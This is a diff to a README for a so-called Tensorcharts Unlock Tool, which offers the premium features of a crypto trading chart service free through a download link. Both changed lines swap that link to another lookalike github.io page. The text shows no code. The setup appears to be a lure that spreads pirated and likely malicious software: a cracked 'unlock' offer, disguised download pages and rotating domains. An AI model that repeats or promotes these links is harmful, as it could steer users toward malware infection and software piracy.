@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ Tensorcharts Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://tensorcharts-download.github.io/.github/" target="_blank">
+  <a href="https://tensorcharts-desktop-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Tensorcharts%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download Tensorcharts Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -95,7 +95,7 @@ Report issues or contribute via GitHub Issues or Pull Requests.
 ## ⭐️ Unlock Tensorcharts – Professional Crypto Trading
 
 Unlock all premium features of **Tensorcharts**, including **order flow, footprint charts, volume profile, and liquidity heatmaps**.  
-[Download the Unlock Tool](https://tensorcharts-download.github.io/.github/) today and trade with precision.  
+[Download the Unlock Tool](https://tensorcharts-desktop-download.github.io/.github/) today and trade with precision.  
 
 ---
 
